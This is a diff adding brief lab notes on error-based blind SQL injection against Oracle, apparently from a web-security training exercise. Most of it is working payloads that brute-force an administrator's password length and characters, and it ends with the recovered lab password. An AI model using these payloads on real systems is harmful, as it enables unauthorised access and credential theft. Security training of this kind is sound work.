@@ -1,0 +1,35 @@
+HARiLtFbp9rahhXF -> tracking id
+
+payload 
+
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+
+
+// To check the length of the password and check username = administrator exists or not
+
+' AND (SELECT CASE WHEN lENGTH(password) >1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+
+if we get error while running this query that means we are correct \
+
+
+
+// we brute force to check the passwoord length while sending it to intruder and running the number payload 1 to 20 in step 1
+
+' AND (SELECT CASE WHEN lENGTH(password) >20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+
+
+
+// So after brute forcing running this query we can figure out the password is of 19 characters
+
+' AND (SELECT CASE WHEN lENGTH(password) >19 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+
+
+
+' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+
+
+// Password we get from brute forcing
+
+password - a1fyng9tdjirlzmujt1d
+
+ltDE1o3VqM678lmG
